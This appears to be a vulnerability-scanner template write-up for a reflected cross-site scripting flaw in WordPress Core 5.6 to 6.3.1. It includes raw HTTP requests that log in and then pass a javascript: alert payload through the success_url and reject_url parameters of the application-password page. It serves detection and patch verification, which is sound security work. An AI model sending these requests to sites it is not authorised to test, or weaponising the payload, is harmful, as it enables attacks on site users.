# Nuclei Template: WordPress Core 5.6 and 6.3.1 - Cross-Site Scripting
**Template ID:** application-pass-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`application-pass-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Core is vulnerable to Reflected Cross-Site Scripting via the 'success_url' and 'reject_url' parameters when requesting application passwords in versions between 5.6 and 6.3.1 due to insufficient input sanitization and output escaping of pseudo protocol URIs.

## Impact
This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that execute if they can successfully trick a user into performing an action such as clicking on a link and accepting or rejecting the application password.

## Steps to reproduce / Exploit Payload
```http
GET /wp-login.php HTTP/1.1
Host: {{Hostname}}

POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/authorize-application.php?success_url=javascript%3Aalert%28document.domain%29&reject_url=javascript%3Aalert%28document.domain%29 HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-core/wordpress-core-56-631-reflected-cross-site-scripting-via-application-password-requests?asset_slug=wordpress
- https://wpscan.com/vulnerability/da1419cc-d821-42d6-b648-bdb3c70d91f2/
